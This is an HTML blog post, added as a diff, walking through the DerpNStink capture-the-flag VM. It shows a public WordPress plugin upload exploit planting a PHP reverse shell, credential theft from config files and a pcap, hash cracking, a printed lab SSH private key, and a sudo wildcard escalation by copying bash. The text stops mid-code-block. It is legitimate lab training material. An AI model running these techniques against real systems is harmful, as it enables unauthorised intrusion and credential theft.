@@ -1,0 +1,894 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Derpnstink - Core dump overflow</title>
+  <meta name="author" content="chousensha">
+
+  
+  
+  <meta name="description" content="Derpnstink writeup">
+  <meta name="keywords" content="derpnstink, pentest lab, vulnhub, ctf, boot2root">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://chousensha.github.io/blog/2019/05/19/derpnstink">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="Core dump overflow" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-51216602-2']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Core dump overflow</a></h1>
+  
+    <h2>Core dump in progress...</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:chousensha.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/where-to-start">Where to start</a></li>
+  <li><a href="/book-corner">Book corner</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Derpnstink</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2019-05-19T20:36:18+03:00" pubdate data-updated="true">May 19<span>th</span>, 2019</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://chousensha.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Today&rsquo;s VM is inspired from the OSCP labs and it has 4 flags to collect.</p>
+
+<blockquote><p>Mr. Derp and Uncle Stinky are two system administrators who are starting their own company, DerpNStink. Instead of hiring qualified  professionals to build up their IT landscape, they decided to hack together their own system which is almost ready to go live&hellip;</p></blockquote>
+
+<!-- more -->
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ORT   STATE SERVICE VERSION
+</span><span class='line'>21/tcp open  ftp     vsftpd 3.0.2
+</span><span class='line'>22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+</span><span class='line'>| ssh-hostkey:
+</span><span class='line'>|   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
+</span><span class='line'>|   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
+</span><span class='line'>|   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
+</span><span class='line'>|_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
+</span><span class='line'>80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+</span><span class='line'>| http-robots.txt: 2 disallowed entries
+</span><span class='line'>|_/php/ /temporary/
+</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
+</span><span class='line'>|_http-title: DeRPnStiNK</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Not too many ports to play with. No available exploit for the FTP. The web server seems unfinished:</p>
+
+<p><img class="center" src="/images/pentest/derpnstink/derpnstink.png" title="derpnstink" alt="derpnstink"></p>
+
+<p>Let&rsquo;s check the robots.txt entries. The php folder gives a Forbidden error and the temporary one just displays a try harder! message. I ran gobuster on the web server and found a couple more entries. The interesting one was a <em>/weblog</em> folder:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/weblog (Status: 301)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When I hit that in the browser, it gave me a connection error, but for the derpnstink.local domain. So I added that to my /etc/hosts file and then I was able to connect:</p>
+
+<p><img class="center" src="/images/pentest/derpnstink/weblog.png" title="weblog" alt="weblog"></p>
+
+<p>This is a Wordpress site, so I ran a Wordpress scanner on it and the interesting findings were:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
+</span><span class='line'> |     Fixed in: 5.0.1
+</span><span class='line'> |     References:
+</span><span class='line'> |      - https://wpvulndb.com/vulnerabilities/9222
+</span><span class='line'> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
+</span><span class='line'> |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
+</span><span class='line'>
+</span><span class='line'> [!] Title: Slideshow Gallery &lt; 1.4.7 Arbitrary File Upload
+</span><span class='line'>  |     Fixed in: 1.4.7
+</span><span class='line'>  |     References:
+</span><span class='line'>  |      - https://wpvulndb.com/vulnerabilities/7532
+</span><span class='line'>  |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460
+</span><span class='line'>  |      - https://www.exploit-db.com/exploits/34681/
+</span><span class='line'>  |      - https://www.exploit-db.com/exploits/34514/
+</span><span class='line'>  |      - http://seclists.org/bugtraq/2014/Sep/1
+</span><span class='line'>  |      - http://packetstormsecurity.com/files/131526/
+</span><span class='line'>  |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_slideshowgallery_upload</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It seems not much can be done without authentication, so I went to wp-admin and enumerated the username <em>admin</em> as a valid user&hellip;and in the process also discovered that the password is <em>admin</em>..derp! Now I could use an <a href="https://www.exploit-db.com/exploits/34681">exploit for the authenticated arbitrary file upload</a> with <code>python gallery.py -t <a href="http://derpnstink.local/weblog/">http://derpnstink.local/weblog/</a> -f ~/Desktop/php-reverse-shell.php -u admin -p admin</code>, and you can find the uploaded shell at <a href="http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php">http://derpnstink.local/weblog//wp-content/uploads/slideshow-gallery/php-reverse-shell.php</a></p>
+
+<p>From your new shell, if you look inside <code>/var/www/html/weblog/wp-config.php</code>, you can find the MySQL credentials:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/** The name of the database for WordPress */
+</span><span class='line'>define('DB_NAME', 'wordpress');
+</span><span class='line'>
+</span><span class='line'>/** MySQL database username */
+</span><span class='line'>define('DB_USER', 'root');
+</span><span class='line'>
+</span><span class='line'>/** MySQL database password */
+</span><span class='line'>define('DB_PASSWORD', 'mysql');
+</span><span class='line'>
+</span><span class='line'>/** MySQL hostname */
+</span><span class='line'>define('DB_HOST', 'localhost');</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside <code>/var/www/html/php/info.php</code> there is a line stating that there&rsquo;s a PHPMyAdmin interface:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/* management interface can be found at /phpmyadmin</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I went to <a href="http://derpnstink.local/php/phpmyadmin/">http://derpnstink.local/php/phpmyadmin/</a> and used the credentials to get in the wordpress database and get 2 users and hashes:</p>
+
+<p><img class="center" src="/images/pentest/derpnstink/users.png" title="users" alt="users"></p>
+
+<p>We already know the admin credentials, so I used john and the rockyou.txt wordlist to crack the hash and get the password <em>wedgie57</em> for user <em>unclestinky</em>. My first move was to try SSH&#8217;ing in, but public key authentication was configured. That left the FTP, and I was able to log in with the credentials <em>stinky</em>:<em>wedgie57</em> (there was no unclestinky user configured on the system)</p>
+
+<p>On the FTP, we find a folder with some files that I downloaded on my machine for a better look: <code>wget -r <a href="ftp://derpnstink.local/files">ftp://derpnstink.local/files</a> &mdash;ftp-user=stinky &mdash;ftp-password=wedgie57</code></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ftp&gt; dir
+</span><span class='line'>200 PORT command successful. Consider using PASV.
+</span><span class='line'>150 Here comes the directory listing.
+</span><span class='line'>drwxr-xr-x    5 1001     1001         4096 Nov 12  2017 files
+</span><span class='line'>226 Directory send OK.
+</span><span class='line'>ftp&gt; ls files
+</span><span class='line'>200 PORT command successful. Consider using PASV.
+</span><span class='line'>150 Here comes the directory listing.
+</span><span class='line'>drwxr-xr-x    2 1001     1001         4096 Nov 12  2017 network-logs
+</span><span class='line'>drwxr-xr-x    3 1001     1001         4096 Nov 12  2017 ssh
+</span><span class='line'>-rwxr-xr-x    1 0        0              17 Nov 12  2017 test.txt
+</span><span class='line'>drwxr-xr-x    2 0        0            4096 Nov 12  2017 tmp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside network-logs there&rsquo;s a file that hints at some PCAP analysis:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat derpissues.txt
+</span><span class='line'>12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
+</span><span class='line'>12:07 stinky: yeah. did you need a password reset?
+</span><span class='line'>12:07 mrderp: I think i accidently deleted my account
+</span><span class='line'>12:07 mrderp: i just need to logon once to make a change
+</span><span class='line'>12:07 stinky: im gonna packet capture so we can figure out whats going on
+</span><span class='line'>12:07 mrderp: that seems a bit overkill, but wtv
+</span><span class='line'>12:08 stinky: commence the sniffer!!!!
+</span><span class='line'>12:08 mrderp: -_-
+</span><span class='line'>12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
+</span><span class='line'>12:11 mrderp: awesome it works!
+</span><span class='line'>12:12 stinky: we really are the best sysadmins #team
+</span><span class='line'>12:13 mrderp: i guess we are...
+</span><span class='line'>12:15 mrderp: alright I made the changes, feel free to decomission my account
+</span><span class='line'>12:20 stinky: done! yay</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside <em>/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh</em> there&rsquo;s a private key:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat key.txt
+</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
+</span><span class='line'>MIIEowIBAAKCAQEAwSaN1OE76mjt64fOpAbKnFyikjz4yV8qYUxki+MjiRPqtDo4
+</span><span class='line'>2xba3Oo78y82svuAHBm6YScUos8dHUCTMLA+ogsmoDaJFghZEtQXugP8flgSk9cO
+</span><span class='line'>uJzOt9ih/MPmkjzfvDL9oW2Nh1XIctVfTZ6o8ZeJI8Sxh8Eguh+dw69M+Ad0Dimn
+</span><span class='line'>AKDPdL7z7SeWg1BJ1q/oIAtJnv7yJz2iMbZ6xOj6/ZDE/2trrrdbSyMc5CyA09/f
+</span><span class='line'>5xZ9f1ofSYhiCQ+dp9CTgH/JpKmdsZ21Uus8cbeGk1WpT6B+D8zoNgRxmO3/VyVB
+</span><span class='line'>LHXaio3hmxshttdFp4bFc3foTTSyJobGoFX+ewIDAQABAoIBACESDdS2H8EZ6Cqc
+</span><span class='line'>nRfehdBR2A/72oj3/1SbdNeys0HkJBppoZR5jE2o2Uzg95ebkiq9iPjbbSAXICAD
+</span><span class='line'>D3CVrJOoHxvtWnloQoADynAyAIhNYhjoCIA5cPdvYwTZMeA2BgS+IkkCbeoPGPv4
+</span><span class='line'>ZpHuqXR8AqIaKl9ZBNZ5VVTM7fvFVl5afN5eWIZlOTDf++VSDedtR7nL2ggzacNk
+</span><span class='line'>Q8JCK9mF62wiIHK5Zjs1lns4Ii2kPw+qObdYoaiFnexucvkMSFD7VAdfFUECQIyq
+</span><span class='line'>YVbsp5tec2N4HdhK/B0V8D4+6u9OuoiDFqbdJJWLFQ55e6kspIWQxM/j6PRGQhL0
+</span><span class='line'>DeZCLQECgYEA9qUoeblEro6ICqvcrye0ram38XmxAhVIPM7g5QXh58YdB1D6sq6X
+</span><span class='line'>VGGEaLxypnUbbDnJQ92Do0AtvqCTBx4VnoMNisce++7IyfTSygbZR8LscZQ51ciu
+</span><span class='line'>Qkowz3yp8XMyMw+YkEV5nAw9a4puiecg79rH9WSr4A/XMwHcJ2swloECgYEAyHn7
+</span><span class='line'>VNG/Nrc4/yeTqfrxzDBdHm+y9nowlWL+PQim9z+j78tlWX/9P8h98gOlADEvOZvc
+</span><span class='line'>fh1eW0gE4DDyRBeYetBytFc0kzZbcQtd7042/oPmpbW55lzKBnnXkO3BI2bgU9Br
+</span><span class='line'>7QTsJlcUybZ0MVwgs+Go1Xj7PRisxMSRx8mHbvsCgYBxyLulfBz9Um/cTHDgtTab
+</span><span class='line'>L0LWucc5KMxMkTwbK92N6U2XBHrDV9wkZ2CIWPejZz8hbH83Ocfy1jbETJvHms9q
+</span><span class='line'>cxcaQMZAf2ZOFQ3xebtfacNemn0b7RrHJibicaaM5xHvkHBXjlWN8e+b3x8jq2b8
+</span><span class='line'>gDfjM3A/S8+Bjogb/01JAQKBgGfUvbY9eBKHrO6B+fnEre06c1ArO/5qZLVKczD7
+</span><span class='line'>RTazcF3m81P6dRjO52QsPQ4vay0kK3vqDA+s6lGPKDraGbAqO+5paCKCubN/1qP1
+</span><span class='line'>14fUmuXijCjikAPwoRQ//5MtWiwuu2cj8Ice/PZIGD/kXk+sJXyCz2TiXcD/qh1W
+</span><span class='line'>pF13AoGBAJG43weOx9gyy1Bo64cBtZ7iPJ9doiZ5Y6UWYNxy3/f2wZ37D99NSndz
+</span><span class='line'>UBtPqkw0sAptqkjKeNtLCYtHNFJAnE0/uAGoAyX+SHhas0l2IYlUlk8AttcHP1kA
+</span><span class='line'>a4Id4FlCiJAXl3/ayyrUghuWWA3jMW3JgZdMyhU3OV+wyZz25S8o
+</span><span class='line'>-----END RSA PRIVATE KEY-----</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we can SSH on the box:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -i stinky_key stinky@derpnstink.local
+</span><span class='line'>Ubuntu 14.04.5 LTS
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>                       ,~~~~~~~~~~~~~..
+</span><span class='line'>                       '  Derrrrrp  N  `
+</span><span class='line'>        ,~~~~~~,       |    Stink      |
+</span><span class='line'>       / ,      \      ',  ________ _,"
+</span><span class='line'>      /,~|_______\.      \/
+</span><span class='line'>     /~ (__________)
+</span><span class='line'>    (*)  ; (^)(^)':
+</span><span class='line'>        =;  ____  ;
+</span><span class='line'>          ; """"  ;=
+</span><span class='line'>   {"}_   ' '""' ' _{"}
+</span><span class='line'>   \__/     &gt;  &lt;   \__/
+</span><span class='line'>      \    ,"   ",  /
+</span><span class='line'>       \  "       /"
+</span><span class='line'>          "      "=
+</span><span class='line'>           &gt;     &lt;
+</span><span class='line'>          ="     "-
+</span><span class='line'>          -`.   ,'
+</span><span class='line'>                -
+</span><span class='line'>            `--'
+</span><span class='line'>
+</span><span class='line'>Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)
+</span><span class='line'>
+</span><span class='line'> * Documentation:  https://help.ubuntu.com/
+</span><span class='line'>
+</span><span class='line'>331 packages can be updated.
+</span><span class='line'>231 updates are security updates.
+</span><span class='line'>
+</span><span class='line'>Last login: Mon Nov 13 00:31:29 2017 from 192.168.1.129
+</span><span class='line'>stinky@DeRPnStiNK:~$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside Documents there&rsquo;s the derpissues.pcap file. I ran <code>strings derpissues.pcap | grep pass</code> on it to get another set of credentials:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>user_login=mrderp
+</span><span class='line'>pass1=derpderpderpderpderpderpderp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the /etc/passwd file we can find a mrderp user, so I tried to SSH and got in. On the Desktop, I found a file with a helpdesk ticket about sudo issues:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mrderp@DeRPnStiNK:~$ cat Desktop/helpdesk.log
+</span><span class='line'>From: Help Desk &lt;helpdesk@derpnstink.local&gt;
+</span><span class='line'>Date: Thu, Aug 23, 2017 at 1:29 PM
+</span><span class='line'>Subject: sudoers ISSUE=242 PROJ=26
+</span><span class='line'>To: Derp, Mr (mrderp) [C]
+</span><span class='line'>When replying, type your text above this line.
+</span><span class='line'>
+</span><span class='line'>Help Desk Ticket Notification
+</span><span class='line'>Thank you for contacting the Help Desk. Your ticket information is below. If you have any
+</span><span class='line'>additional information to add to this ticket, please reply to this notification.
+</span><span class='line'>If you need immediate help (i.e. you are within two days of a deadline or in the event of a
+</span><span class='line'>security emergency), call us. Note that the Help Desk's busiest hours are between 10 a.m. (ET)
+</span><span class='line'>and 3 p.m. (ET).
+</span><span class='line'>
+</span><span class='line'>Toll-free: 1-866-504-9552
+</span><span class='line'>Phone: 301-402-7469
+</span><span class='line'>TTY: 301-451-5939
+</span><span class='line'>Ticket Title: Sudoers File issues
+</span><span class='line'>Ticket Number: 242
+</span><span class='line'>Status: Break/fix
+</span><span class='line'>Date Created: 08/23/2017
+</span><span class='line'>Latest Update Date: 08/23/2017
+</span><span class='line'>Contact Name: Mr Derp
+</span><span class='line'>CC’s: Uncle Stinky
+</span><span class='line'>Full description and latest notes on your Ticket: Sudoers File issues
+</span><span class='line'>Notification
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Regards,
+</span><span class='line'>Service Desk
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>Listen with focus, answer with accuracy, assist with compassion.
+</span><span class='line'>
+</span><span class='line'>From: Help Desk
+</span><span class='line'>Date: Mon, Sep 10, 2017 at 2:53 PM
+</span><span class='line'>Subject: sudoers ISSUE=242 PROJ=26
+</span><span class='line'>To: Derp, Mr (mrderp) [C]
+</span><span class='line'>When replying, type your text above this line.
+</span><span class='line'>
+</span><span class='line'>Closed Ticket Notification
+</span><span class='line'>
+</span><span class='line'>Thank you for contacting the Help Desk. Your ticket information and its resolution is
+</span><span class='line'>below. If you feel that the ticket has not been resolved to your satisfaction or you need additional
+</span><span class='line'>assistance, please reply to this notification to provide additional information.
+</span><span class='line'>If you need immediate help (i.e. you are within two days of a deadline or in the event of a
+</span><span class='line'>security emergency), call us or visit our Self Help Web page at https://pastebin.com/RzK9WfGw
+</span><span class='line'>Note that the Help Desk's busiest hours are between 10 a.m. (ET)
+</span><span class='line'>and 3 p.m. (ET).
+</span><span class='line'>Toll-free: 1-866-504-9552
+</span><span class='line'>Phone: 301-402-7469
+</span><span class='line'>TTY: 301-451-5939
+</span><span class='line'>Ticket Title: sudoers issues
+</span><span class='line'>Ticket Number: 242
+</span><span class='line'>Status: Closed
+</span><span class='line'>Date Created: 09/10/2017
+</span><span class='line'>Latest Update Date: 09/10/2017
+</span><span class='line'>CC’s:
+</span><span class='line'>Resolution: Closing ticket. ticket notification.
+</span><span class='line'>
+</span><span class='line'>Regards,
+</span><span class='line'>eRA Service Desk
+</span><span class='line'>Listen with focus, answer with accuracy, assist with compassion.
+</span><span class='line'>For more information, dont forget to visit the Self Help Web page!!!</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On the root filesystem, I found an interesting folder called /support with more information about this sudo issue:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mrderp@DeRPnStiNK:~$ cat /support/troubleshooting.txt
+</span><span class='line'>*******************************************************************
+</span><span class='line'>On one particular machine I often need to run sudo commands every now and then. I am fine with entering password on sudo in most of the cases.
+</span><span class='line'>
+</span><span class='line'>However i dont want to specify each command to allow
+</span><span class='line'>
+</span><span class='line'>How can I exclude these commands from password protection to sudo?
+</span><span class='line'>
+</span><span class='line'>********************************************************************
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>********************************************************************
+</span><span class='line'>Thank you for contacting the Client Support team. This message is to confirm that we have resolved and closed your ticket.
+</span><span class='line'>
+</span><span class='line'>Please contact the Client Support team at https://pastebin.com/RzK9WfGw if you have any further questions or issues.
+</span><span class='line'>
+</span><span class='line'>Thank you for using our product.
+</span><span class='line'>
+</span><span class='line'>********************************************************************</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Running a <strong>sudo -l</strong> gives us the sudo commands that mrderp can run:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>User mrderp may run the following commands on DeRPnStiNK:
+</span><span class='line'>    (ALL) /home/mrderp/binaries/derpy*</span></code></pre></td></tr></table></div></figure>
+
+
+<p>All I had to do at this point was to create a binaries directory, copy the bash executable to something with derpy in the name and run it as sudo:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
